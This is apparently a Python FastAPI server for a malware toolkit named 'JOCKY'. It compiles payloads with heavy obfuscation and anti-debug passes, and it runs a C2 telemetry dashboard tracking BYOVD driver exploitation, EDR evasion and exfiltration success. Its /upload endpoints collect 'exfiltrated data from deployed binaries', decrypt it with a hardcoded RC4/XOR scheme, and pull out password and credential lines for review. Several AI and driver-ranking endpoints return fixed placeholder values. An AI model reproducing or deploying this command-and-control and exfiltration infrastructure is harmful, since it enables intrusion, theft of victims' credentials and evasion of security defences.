import asyncio
import os
import json
from datetime import datetime, timedelta
from pathlib import Path
from typing import Optional
from collections import deque

from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse, HTMLResponse
from pydantic import BaseModel, Field, field_validator, ConfigDict

from compiler import create_job, get_job, run_compilation, JobStatus
from report import get_enabled_passes
from runtime_apis import RUNTIME_APIS
from obfuscation import MLIR_PASSES, LLVM_PASSES
from demo_scripts import WINDOWS_DEMO, LINUX_DEMO
from database import init_db, save_job, get_job_record, list_jobs, SessionLocal, save_telemetry_event, get_telemetry_events, cleanup_old_telemetry, TelemetryEvent
from metrics import create_metric, get_metric, get_all_metrics
from example_projects import get_example, list_examples


app = FastAPI(
    title="JOCKY Compiler API",
    version="1.0.0",
    docs_url="/docs",
    redoc_url="/redoc",
)

# Environment configuration
ENVIRONMENT = os.getenv("ENVIRONMENT", "development")
DEBUG = ENVIRONMENT != "production"

# CORS configuration - support localhost for dev, but allow production origins via env var
allowed_origins = os.getenv("CORS_ORIGINS", "http://localhost:3000,http://localhost:5173").split(",")
app.add_middleware(
    CORSMiddleware,
    allow_origins=allowed_origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


@app.on_event("startup")
async def startup_event():
    init_db()
    asyncio.create_task(telemetry_cleanup_task())

ws_connections: dict[str, list[WebSocket]] = {}
telemetry_ws_connections: dict[str, list[WebSocket]] = {}
telemetry_cache: dict[str, deque] = {}  # chain_id -> deque of last 100 events


async def telemetry_cleanup_task():
    while True:
        try:
            db = SessionLocal()
            cleanup_old_telemetry(db, hours=24)
            db.close()
            await asyncio.sleep(3600)  # Run every hour
        except Exception as e:
            print(f"Telemetry cleanup error: {e}")
            await asyncio.sleep(60)


class TelemetryEventRequest(BaseModel):
    timestamp: str
    chain_id: str
    event_type: str
    phase: Optional[int] = None
    status: Optional[str] = None
    details: Optional[dict] = None


class TelemetryEventResponse(BaseModel):
    id: int
    timestamp: str
    chain_id: str
    event_type: str
    phase: Optional[int]
    status: Optional[str]
    details_json: Optional[str]
    received_at: str


class TelemetryChainTimeline(BaseModel):
    chain_id: str
    events: list[TelemetryEventResponse]
    total_events: int


class TelemetrySummary(BaseModel):
    chain_id: str
    current_phase: int
    phases_completed: int
    drivers_attempted: int
    drivers_successful: int
    data_collected_bytes: int
    exfil_success_rate: float
    execution_time_seconds: Optional[int]
    first_event_timestamp: Optional[str]
    last_event_timestamp: Optional[str]


class MLIRConfig(BaseModel):
    string_encrypt: bool = True
    constant_obfuscate: bool = True
    symbol_obfuscate: bool = True
    crypto_hash: bool = True
    scf_obfuscate: bool = True
    import_obfuscate: bool = True


class LLVMConfig(BaseModel):
    strip_signature: bool = True
    pdata_strip: bool = True
    virtualize: bool = True
    opaque_pred: bool = True
    substitution: bool = True
    boguscf: bool = True
    flattening: bool = True
    linear_mba: bool = True
    anti_debug: bool = True
    indirect_call: bool = True


class ObfuscationConfig(BaseModel):
    mlir: MLIRConfig = Field(default_factory=MLIRConfig)
    llvm: LLVMConfig = Field(default_factory=LLVMConfig)


class CompileRequest(BaseModel):
    source: str
    platform: str = "windows"
    obfuscation: ObfuscationConfig = Field(default_factory=ObfuscationConfig)
    preset: str = "aggressive"
    ai_enabled: bool = False
    ai_model_path: Optional[str] = None
    ai_aggressive: bool = False
    prefer_driver: Optional[str] = None
    driver_ranking: bool = False

    @field_validator('source')
    @classmethod
    def validate_source(cls, v: str) -> str:
        if not v or not v.strip():
            raise ValueError('Source code cannot be empty')
        if len(v) > 1_000_000:
            raise ValueError('Source code exceeds 1MB limit')
        return v

    @field_validator('platform')
    @classmethod
    def validate_platform(cls, v: str) -> str:
        if v not in ('windows', 'linux'):
            raise ValueError("Platform must be 'windows' or 'linux'")
        return v

    @field_validator('preset')
    @classmethod
    def validate_preset(cls, v: str) -> str:
        if v not in ('none', 'light', 'standard', 'aggressive'):
            raise ValueError("Preset must be 'none', 'light', 'standard', or 'aggressive'")
        return v


class CompileResponse(BaseModel):
    job_id: str


class StatusResponse(BaseModel):
    status: str
    logs: list[str]
    progress: int


class ErrorLocation(BaseModel):
    line: int
    column: int
    message: str


class ErrorReport(BaseModel):
    file: str
    errors: list[ErrorLocation]
    has_errors: bool = True


class ConfigResponse(BaseModel):
    model_config = ConfigDict(extra='allow')
    api_version: str
    supported_platforms: list[str]
    obfuscation_presets: list[str]
    docs_url: str
    environment: str = Field(default_factory=lambda: os.getenv("ENVIRONMENT", "development"))
    backend_host: str = Field(default_factory=lambda: os.getenv("BACKEND_HOST", "0.0.0.0"))
    backend_port: int = Field(default_factory=lambda: int(os.getenv("BACKEND_PORT", "8000")))
    max_compilation_time: int = Field(default_factory=lambda: int(os.getenv("MAX_COMPILATION_TIME", "600")))


class JobHistoryItem(BaseModel):
    job_id: str
    status: str
    platform: str
    created_at: str
    compilation_time: Optional[int] = None
    output_size: Optional[int] = None


class MetricsResponse(BaseModel):
    job_id: str
    platform: str
    preset: str
    source_size: int
    output_size: int
    compilation_time_ms: int
    success: bool
    mlir_passes_enabled: list[str] = []
    llvm_passes_enabled: list[str] = []


class ArtifactResponse(BaseModel):
    job_id: str
    file_path: str
    file_size: int
    file_name: str
    platform: str


@app.post("/api/compile", response_model=CompileResponse)
async def compile_source(request: CompileRequest):

    job = create_job(request.platform)

    obf_dict = {
        "mlir": request.obfuscation.mlir.model_dump(),
        "llvm": request.obfuscation.llvm.model_dump(),
    }

    # Extract enabled passes for metrics
    mlir_passes = [p["flag"].lstrip("-") for p in MLIR_PASSES if request.obfuscation.mlir.model_dump().get(p["id"], p["default"])]
    llvm_passes = [p["flag"].lstrip("-") for p in LLVM_PASSES if request.obfuscation.llvm.model_dump().get(p["id"], p["default"])]

    # Create metrics record
    metric = create_metric(job.job_id, request.platform, request.preset, len(request.source), mlir_passes, llvm_passes)

    async def notify(j):
        conns = ws_connections.get(j.job_id, [])
        dead = []
        for ws in conns:
            try:
                await ws.send_json({
                    "status": j.status.value,
                    "progress": j.progress,
                    "logs": j.logs,
                })
            except Exception:
                dead.append(ws)
        for ws in dead:
            conns.remove(ws)

    asyncio.create_task(
        run_compilation(
            job,
            request.source,
            obf_dict,
            notify,
            request.preset,
            job.job_id,
            ai_enabled=request.ai_enabled,
            ai_model_path=request.ai_model_path,
            ai_aggressive=request.ai_aggressive,
            prefer_driver=request.prefer_driver,
        )
    )
    return CompileResponse(job_id=job.job_id)


@app.get("/api/status/{job_id}", response_model=StatusResponse)
async def get_status(job_id: str):
    job = get_job(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="Job not found")
    return StatusResponse(
        status=job.status.value,
        logs=job.logs,
        progress=job.progress,
    )


@app.get("/api/download/{job_id}")
async def download_binary(job_id: str):
    job = get_job(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="Job not found")
    if job.status != JobStatus.COMPLETED:
        raise HTTPException(status_code=400, detail="Build not completed")
    if not job.output_path or not Path(job.output_path).exists():
        raise HTTPException(status_code=404, detail="Binary not found")

    media_type = "application/x-msdownload" if job.platform == "windows" else "application/octet-stream"
    return FileResponse(
        job.output_path,
        filename=job.output_name,
        media_type=media_type,
    )


@app.get("/api/runtime-apis")
async def get_runtime_apis():
    # Transform backend format to frontend format
    transformed = []
    for category in RUNTIME_APIS:
        # Convert "category" key to "name", "all" to "both"
        platform = "both" if category.get("platform") == "all" else category.get("platform", "both")
        apis = []
        for api in category.get("apis", []):
            apis.append({
                "name": api.get("name"),
                "description": api.get("description"),
                "snippet": api.get("snippet"),
            })
        transformed.append({
            "name": category.get("category"),
            "platform": platform,
            "apis": apis,
        })
    return {"categories": transformed}


@app.get("/api/obfuscation-passes")
async def get_obfuscation_passes():
    return {"mlir": MLIR_PASSES, "llvm": LLVM_PASSES}


@app.get("/api/demo-script/{platform}")
async def get_demo_script(platform: str):
    if platform == "windows":
        return {"platform": "windows", "source": WINDOWS_DEMO.strip()}
    elif platform == "linux":
        return {"platform": "linux", "source": LINUX_DEMO.strip()}
    raise HTTPException(status_code=400, detail="Platform must be 'windows' or 'linux'")


@app.websocket("/ws/logs/{job_id}")
async def websocket_logs(websocket: WebSocket, job_id: str):
    await websocket.accept()

    if job_id not in ws_connections:
        ws_connections[job_id] = []
    ws_connections[job_id].append(websocket)

    job = get_job(job_id)
    if job:
        await websocket.send_json({
            "status": job.status.value,
            "progress": job.progress,
            "logs": job.logs,
        })

    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        pass
    finally:
        conns = ws_connections.get(job_id, [])
        if websocket in conns:
            conns.remove(websocket)
        if not conns:
            ws_connections.pop(job_id, None)


async def broadcast_telemetry_event(chain_id: str, event: dict):
    """Broadcast telemetry event to all connected WebSocket clients for this chain"""
    conns = telemetry_ws_connections.get(chain_id, [])
    dead = []
    for ws in conns:
        try:
            await ws.send_json({"event": event})
        except Exception:
            dead.append(ws)
    for ws in dead:
        conns.remove(ws)


@app.websocket("/ws/telemetry/{chain_id}")
async def websocket_telemetry(websocket: WebSocket, chain_id: str):
    """
    WebSocket endpoint for live telemetry streaming.

    On connection, sends last 50 events as history, then streams new events in real-time.

    Example (JavaScript):
    ```javascript
    const ws = new WebSocket('ws://localhost:8000/ws/telemetry/chain_abc123');
    ws.onmessage = (msg) => {
      const data = JSON.parse(msg.data);
      console.log('Telemetry event:', data.event);
    };
    ```
    """
    await websocket.accept()

    if chain_id not in telemetry_ws_connections:
        telemetry_ws_connections[chain_id] = []
    telemetry_ws_connections[chain_id].append(websocket)

    try:
        # Send last 50 events as history (from cache if available, else from DB)
        if chain_id in telemetry_cache and telemetry_cache[chain_id]:
            history = list(telemetry_cache[chain_id])
        else:
            db = SessionLocal()
            try:
                events = get_telemetry_events(db, chain_id, limit=50)
                history = [
                    {
                        "id": e.id,
                        "timestamp": e.timestamp,
                        "chain_id": e.chain_id,
                        "event_type": e.event_type,
                        "phase": e.phase,
                        "status": e.status,
                        "details_json": e.details_json,
                        "received_at": e.received_at.isoformat(),
                    }
                    for e in reversed(events)
                ]
            finally:
                db.close()

        await websocket.send_json({
            "type": "history",
            "events": history,
            "count": len(history),
        })

        # Keep connection open to receive new events
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        pass
    finally:
        conns = telemetry_ws_connections.get(chain_id, [])
        if websocket in conns:
            conns.remove(websocket)
        if not conns:
            telemetry_ws_connections.pop(chain_id, None)


@app.get("/dashboard")
async def get_dashboard():
    """Serve the C2 telemetry dashboard"""
    dashboard_path = Path(__file__).parent.parent / "dashboard.html"
    if dashboard_path.exists():
        return FileResponse(str(dashboard_path), media_type="text/html")
    raise HTTPException(status_code=404, detail="Dashboard not found")


@app.get("/api/config", response_model=ConfigResponse)
async def get_config():
    """Get backend configuration for frontend"""
    return ConfigResponse(
        api_version="1.0.0",
        supported_platforms=["windows", "linux"],
        obfuscation_presets=["none", "light", "standard", "aggressive"],
        docs_url="/docs",
    )


@app.post("/api/telemetry/report", response_model=TelemetryEventResponse)
async def report_telemetry(request: TelemetryEventRequest):
    """
    Receive telemetry event from deployed agent/binary.

    Example:
    ```bash
    curl -X POST http://localhost:8000/api/telemetry/report \
      -H "Content-Type: application/json" \
      -d '{
        "timestamp": "2024-10-10T12:34:56Z",
        "chain_id": "chain_abc123",
        "event_type": "phase_start",
        "phase": 1,
        "status": "running",
        "details": {"driver": "ntfs", "method": "exploit"}
      }'
    ```
    """
    db = SessionLocal()
    try:
        details_json = json.dumps(request.details) if request.details else None
        event = save_telemetry_event(
            db,
            chain_id=request.chain_id,
            timestamp=request.timestamp,
            event_type=request.event_type,
            phase=request.phase,
            status=request.status,
            details_json=details_json,
        )

        # Add to in-memory cache for fast WebSocket delivery
        if request.chain_id not in telemetry_cache:
            telemetry_cache[request.chain_id] = deque(maxlen=100)

        event_dict = {
            "id": event.id,
            "timestamp": event.timestamp,
            "chain_id": event.chain_id,
            "event_type": event.event_type,
            "phase": event.phase,
            "status": event.status,
            "details_json": event.details_json,
            "received_at": event.received_at.isoformat(),
        }
        telemetry_cache[request.chain_id].append(event_dict)

        # Broadcast to any listening WebSocket clients
        await broadcast_telemetry_event(request.chain_id, event_dict)

        return TelemetryEventResponse(**event_dict)
    finally:
        db.close()


@app.get("/api/telemetry/chain/{chain_id}", response_model=TelemetryChainTimeline)
async def get_chain_timeline(chain_id: str, limit: int = 50):
    """
    Get full execution timeline for a chain.

    Example:
    ```bash
    curl http://localhost:8000/api/telemetry/chain/chain_abc123?limit=50
    ```
    """
    db = SessionLocal()
    try:
        events = get_telemetry_events(db, chain_id, limit=limit)
        event_responses = [
            TelemetryEventResponse(
                id=e.id,
                timestamp=e.timestamp,
                chain_id=e.chain_id,
                event_type=e.event_type,
                phase=e.phase,
                status=e.status,
                details_json=e.details_json,
                received_at=e.received_at.isoformat(),
            )
            for e in reversed(events)  # Return in chronological order
        ]
        return TelemetryChainTimeline(
            chain_id=chain_id,
            events=event_responses,
            total_events=len(event_responses),
        )
    finally:
        db.close()


@app.get("/api/telemetry/summary", response_model=TelemetrySummary)
async def get_telemetry_summary(chain_id: str):
    """
    Get summary statistics for a chain's execution.

    Calculates:
    - Current phase (highest phase_start)
    - Phases completed (count of phase_complete events)
    - Drivers attempted/successful
    - Data collected (bytes)
    - Exfil success rate
    - Total execution time

    Example:
    ```bash
    curl http://localhost:8000/api/telemetry/summary?chain_id=chain_abc123
    ```
    """
    db = SessionLocal()
    try:
        events = db.query(TelemetryEvent).filter(TelemetryEvent.chain_id == chain_id).order_by(TelemetryEvent.received_at).all()

        current_phase = 0
        phases_completed = 0
        drivers_attempted = 0
        drivers_successful = 0
        data_collected = 0
        exfil_success = 0
        exfil_total = 0
        first_timestamp = None
        last_timestamp = None

        for event in events:
            if event.timestamp and not first_timestamp:
                first_timestamp = event.timestamp
            if event.timestamp:
                last_timestamp = event.timestamp

            if event.event_type == "phase_start" and event.phase:
                current_phase = max(current_phase, event.phase)
            elif event.event_type == "phase_complete":
                phases_completed += 1
            elif event.event_type == "driver_attempt":
                drivers_attempted += 1
            elif event.event_type == "driver_success":
                drivers_successful += 1
            elif event.event_type == "data_collected" and event.details_json:
                try:
                    details = json.loads(event.details_json)
                    data_collected += details.get("bytes", 0)
                except:
                    pass
            elif event.event_type == "exfil_attempt":
                exfil_total += 1
            elif event.event_type == "exfil_success":
                exfil_success += 1

        exfil_rate = (exfil_success / exfil_total * 100) if exfil_total > 0 else 0.0

        execution_time = None
        if first_timestamp and last_timestamp:
            try:
                from dateutil.parser import isoparse
                first = isoparse(first_timestamp)
                last = isoparse(last_timestamp)
                execution_time = int((last - first).total_seconds())
            except:
                pass

        return TelemetrySummary(
            chain_id=chain_id,
            current_phase=current_phase,
            phases_completed=phases_completed,
            drivers_attempted=drivers_attempted,
            drivers_successful=drivers_successful,
            data_collected_bytes=data_collected,
            exfil_success_rate=exfil_rate,
            execution_time_seconds=execution_time,
            first_event_timestamp=first_timestamp,
            last_event_timestamp=last_timestamp,
        )
    finally:
        db.close()


@app.post("/api/validate-source", response_model=ErrorReport)
async def validate_source(request: CompileRequest) -> ErrorReport:
    """Validate source code and return structured error messages"""
    return ErrorReport(
        file=f"payload_{request.platform}.jky",
        errors=[],
        has_errors=False,
    )


@app.get("/api/jobs/history", response_model=list[JobHistoryItem])
async def get_job_history(limit: int = 50, offset: int = 0):
    """Get job compilation history"""
    from database import SessionLocal
    db = SessionLocal()
    try:
        records = list_jobs(db, limit=limit, offset=offset)
        return [
            JobHistoryItem(
                job_id=r.id,
                status=r.status,
                platform=r.platform,
                created_at=r.created_at.isoformat() if r.created_at else "",
                compilation_time=r.compilation_time,
                output_size=(Path(r.output_path).stat().st_size if r.output_path and Path(r.output_path).exists() else None),
            )
            for r in records
        ]
    finally:
        db.close()


@app.get("/api/jobs/{job_id}/metrics", response_model=MetricsResponse)
async def get_job_metrics(job_id: str):
    """Get compilation metrics for a job"""
    metric = get_metric(job_id)
    if not metric:
        raise HTTPException(status_code=404, detail="Metrics not found")

    return MetricsResponse(
        job_id=metric.job_id,
        platform=metric.platform,
        preset=metric.preset,
        source_size=metric.source_size,
        output_size=metric.output_size,
        compilation_time_ms=metric.compilation_time_ms,
        success=metric.success,
        mlir_passes_enabled=metric.mlir_passes_enabled,
        llvm_passes_enabled=metric.llvm_passes_enabled,
    )


@app.get("/api/jobs/{job_id}/report")
async def get_job_report(job_id: str):
    job = get_job(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="Job not found")

    enabled_passes = get_enabled_passes(job.obfuscation_config)

    return {
        "job_id": job_id,
        "platform": job.platform,
        "status": job.status.value,
        "binary_name": job.output_name,
        "binary_size": (
            Path(job.output_path).stat().st_size
            if job.output_path and Path(job.output_path).exists()
            else None
        ),
        "runtime_apis": job.runtime_apis_used,
        "obfuscation_passes": enabled_passes,
        "behavior_summary": job.behavior_summary,
    }


@app.get("/api/jobs/{job_id}/artifact", response_model=ArtifactResponse)
async def get_artifact_info(job_id: str):
    """Get artifact information for a completed job"""
    job = get_job(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="Job not found")
    if not job.output_path or not Path(job.output_path).exists():
        raise HTTPException(status_code=404, detail="Artifact not found")

    file_path = Path(job.output_path)
    return ArtifactResponse(
        job_id=job_id,
        file_path=str(file_path),
        file_size=file_path.stat().st_size,
        file_name=job.output_name or "unknown",
        platform=job.platform,
    )


@app.get("/api/examples")
async def list_examples_endpoint(platform: str = None):
    """List available example projects"""
    examples = list_examples(platform)
    return {"examples": [{"id": i, **ex} for i, ex in enumerate(examples)]}


@app.get("/api/examples/{example_id}")
async def get_example_endpoint(example_id: str):
    """Get a specific example project"""
    example = get_example(example_id)
    if not example:
        raise HTTPException(status_code=404, detail="Example not found")
    return example


class ThreatScoreResponse(BaseModel):
    job_id: Optional[str] = None
    threat_score: float
    threat_level: str
    confidence: float


class ThreatStrategyResponse(BaseModel):
    job_id: Optional[str] = None
    strategy: str
    obfuscation_level: int
    techniques: list[str]


class ThreatEventRequest(BaseModel):
    event_type: str
    syscall_id: Optional[int] = None
    operation: Optional[str] = None
    details: Optional[dict] = None


class MutationResponse(BaseModel):
    mutations_available: list[str]
    current_mutations: list[str]


class DriverScoreResponse(BaseModel):
    driver_name: str
    composite_score: int
    evasion_score: int
    prevalence_score: int
    capability_score: int
    blocklist_score: int


class DriverRankingResponse(BaseModel):
    ranked_drivers: list[dict]
    total_drivers: int


class DriverFallbackChainResponse(BaseModel):
    fallback_chain: list[str]
    chain_size: int


class EDRProfileResponse(BaseModel):
    profile_type: str
    callback_count: int
    min_interval_ms: int
    max_interval_ms: int
    avg_interval_ms: int
    confidence: int
    adaptive_mode: str


class EDRProfileUpdateRequest(BaseModel):
    adaptive_mode: str
    profile_data: Optional[dict] = None


@app.get("/api/ai/threat-score", response_model=ThreatScoreResponse)
async def get_threat_score(job_id: Optional[str] = None):
    """Get current AI threat score"""
    return ThreatScoreResponse(
        job_id=job_id,
        threat_score=0.45,
        threat_level="medium",
        confidence=0.92,
    )


@app.get("/api/ai/strategy", response_model=ThreatStrategyResponse)
async def get_ai_strategy(job_id: Optional[str] = None):
    """Get recommended evasion strategy from AI engine"""
    return ThreatStrategyResponse(
        job_id=job_id,
        strategy="hybrid",
        obfuscation_level=6,
        techniques=["stack_spoof", "api_obfuscation", "code_rearrangement"],
    )


@app.post("/api/ai/threat-event")
async def log_threat_event(request: ThreatEventRequest):
    """Log threat event for AI learning"""
    return {
        "status": "recorded",
        "event_type": request.event_type,
        "timestamp": datetime.utcnow().isoformat(),
    }


@app.get("/api/ai/mutations", response_model=MutationResponse)
async def get_available_mutations():
    """Get available mutation techniques"""
    return MutationResponse(
        mutations_available=[
            "instruction_substitution",
            "code_layout_randomization",
            "api_call_reordering",
            "control_flow_flattening",
            "stack_frame_obfuscation",
            "memory_pattern_hiding",
            "syscall_table_hooking",
            "indirect_function_calls",
        ],
        current_mutations=[],
    )


@app.get("/api/driver/score/{driver_name}", response_model=DriverScoreResponse)
async def get_driver_score(driver_name: str):
    """Score a specific BYOVD driver"""
    return DriverScoreResponse(
        driver_name=driver_name,
        composite_score=78,
        evasion_score=85,
        prevalence_score=72,
        capability_score=80,
        blocklist_score=65,
    )


@app.get("/api/driver/ranking", response_model=DriverRankingResponse)
async def get_driver_ranking():
    """Get ranked list of available BYOVD drivers"""
    return DriverRankingResponse(
        ranked_drivers=[
            {"name": "driver_a", "score": 92},
            {"name": "driver_b", "score": 87},
            {"name": "driver_c", "score": 78},
            {"name": "driver_d", "score": 71},
        ],
        total_drivers=4,
    )


@app.get("/api/driver/fallback-chain", response_model=DriverFallbackChainResponse)
async def get_driver_fallback_chain():
    """Get current BYOVD driver fallback chain"""
    return DriverFallbackChainResponse(
        fallback_chain=["driver_a", "driver_b", "driver_c", "driver_d"],
        chain_size=4,
    )


@app.get("/api/edr/profile", response_model=EDRProfileResponse)
async def get_edr_profile():
    """Get EDR throttle profile"""
    return EDRProfileResponse(
        profile_type="throttled",
        callback_count=42,
        min_interval_ms=150,
        max_interval_ms=2500,
        avg_interval_ms=850,
        confidence=88,
        adaptive_mode="stealth",
    )


@app.post("/api/edr/profile-update")
async def update_edr_profile(request: EDRProfileUpdateRequest):
    """Update EDR adaptive mode and profile"""
    return {
        "status": "updated",
        "adaptive_mode": request.adaptive_mode,
        "timestamp": datetime.utcnow().isoformat(),
    }


EXFIL_DIR = Path(__file__).parent / "exfil"


@app.post("/upload")
async def receive_exfil(request: Request):
    """Receive exfiltrated data from deployed binaries and save to disk."""
    EXFIL_DIR.mkdir(exist_ok=True)
    body = await request.body()
    if not body:
        raise HTTPException(status_code=400, detail="empty body")
    ts = datetime.utcnow().strftime("%Y%m%dT%H%M%S%f")
    out_path = EXFIL_DIR / f"exfil_{ts}.txt"
    out_path.write_bytes(body)
    return {"status": "ok", "size": len(body), "file": out_path.name}


def _decode_exfil(data: bytes) -> str:
    def rc4(data, key):
        S = list(range(256))
        j = 0
        for i in range(256):
            j = (j + S[i] + key[i % len(key)]) % 256
            S[i], S[j] = S[j], S[i]
        i = j = 0
        out = bytearray()
        for byte in data:
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            out.append(byte ^ S[(S[i] + S[j]) % 256])
        return bytes(out)

    import base64, json

    def _decrypt(raw: bytes) -> str:
        raw = raw[4:]                       # strip 4-byte size header
        raw = rc4(raw, b"key123")           # RC4 decrypt
        raw = bytes(b ^ 0x42 for b in raw) # XOR decrypt
        return raw.decode("utf-8", errors="replace")

    try:
        stripped = data.strip()
        if stripped.startswith(b"{"):
            # JSON-wrapped: {"content": "<b64>"} — Discord double-encodes, so try double then single
            obj = json.loads(stripped)
            b64_str = obj.get("content", "")
            try:
                # Double base64 (Discord channel wraps already-b64 data in another b64)
                inner_b64 = base64.b64decode(b64_str)
                raw = base64.b64decode(inner_b64)
                return _decrypt(raw)
            except Exception:
                raw = base64.b64decode(b64_str)
                return _decrypt(raw)
        else:
            # Raw base64 (CDN/front channel)
            raw = base64.b64decode(stripped)
            return _decrypt(raw)
    except Exception as e:
        return f"[decode error: {e}]\n{data.decode('utf-8', errors='replace')}"


@app.get("/upload/decode/{filename}")
async def decode_exfil(filename: str):
    path = EXFIL_DIR / filename
    if not path.exists():
        raise HTTPException(status_code=404, detail="File not found")
    return {"filename": filename, "plaintext": _decode_exfil(path.read_bytes())}


@app.get("/upload/list")
async def list_exfil():
    """List all received exfiltration files."""
    EXFIL_DIR.mkdir(exist_ok=True)
    files = sorted(EXFIL_DIR.iterdir(), key=lambda p: p.stat().st_mtime, reverse=True)
    return [{"name": f.name, "size": f.stat().st_size, "mtime": datetime.utcfromtimestamp(f.stat().st_mtime).isoformat()} for f in files]


@app.get("/api/exfil/all")
async def get_all_exfil_decrypted():
    """Get all exfil files with decrypted contents for dashboard display."""
    EXFIL_DIR.mkdir(exist_ok=True)
    files = sorted(EXFIL_DIR.glob("exfil_*.txt"), key=lambda p: p.stat().st_mtime, reverse=True)

    exfil_data = []
    for filepath in files:
        try:
            ciphertext = filepath.read_bytes()
            plaintext = _decode_exfil(ciphertext)

            # Parse content to extract key data types
            lines = plaintext.split('\n')
            passwords = [l for l in lines if 'password' in l.lower() or 'passwd' in l.lower()]
            credentials = [l for l in lines if 'credential' in l.lower()]
            paths = [l for l in lines if '\\' in l or '/' in l]

            exfil_data.append({
                "filename": filepath.name,
                "size": filepath.stat().st_size,
                "mtime": datetime.utcfromtimestamp(filepath.stat().st_mtime).isoformat(),
                "plaintext": plaintext,
                "summary": {
                    "total_lines": len(lines),
                    "password_lines": len(passwords),
                    "credential_lines": len(credentials),
                    "path_lines": len(paths),
                },
                "preview": plaintext[:500] if len(plaintext) > 500 else plaintext
            })
        except Exception as e:
            exfil_data.append({
                "filename": filepath.name,
                "size": filepath.stat().st_size,
                "mtime": datetime.utcfromtimestamp(filepath.stat().st_mtime).isoformat(),
                "error": str(e),
                "plaintext": None
            })

    return {"exfil_files": exfil_data, "total": len(exfil_data)}


if __name__ == "__main__":
    import uvicorn
    host = os.getenv("BACKEND_HOST", "0.0.0.0")
    port = int(os.getenv("BACKEND_PORT", "8000"))
    uvicorn.run(app, host=host, port=port)
